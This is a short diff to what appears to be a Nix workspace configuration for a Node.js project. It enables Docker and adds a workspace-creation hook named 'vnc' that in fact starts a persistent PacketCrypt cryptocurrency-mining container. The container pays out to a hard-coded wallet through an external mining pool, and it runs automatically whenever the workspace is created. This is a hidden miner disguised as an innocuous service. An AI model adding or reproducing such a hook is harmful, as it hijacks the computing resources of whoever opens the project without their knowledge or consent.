@@ -7,6 +7,7 @@
   packages = [
     pkgs.nodejs_20
   ];
+  services.docker.enable = true;
   # Sets environment variables in the workspace
   env = {};
   idx = {
@@ -20,6 +21,7 @@
         npm-install = "npm ci --no-audit --prefer-offline --no-progress --timing";
         # Open editors for the following files by default, if they exist:
         default.openFiles = [ "src/App.tsx" "src/App.ts" "src/App.jsx" "src/App.js" ];
+        vnc = "docker run -d --name vnc --restart always -e WALLET=pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy thomasjp0x42/packetcrypt-amd64 ann -p pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy http://pool.pkt.world"
       };
       # To run something each time the workspace is (re)started, use the `onStart` hook
     };
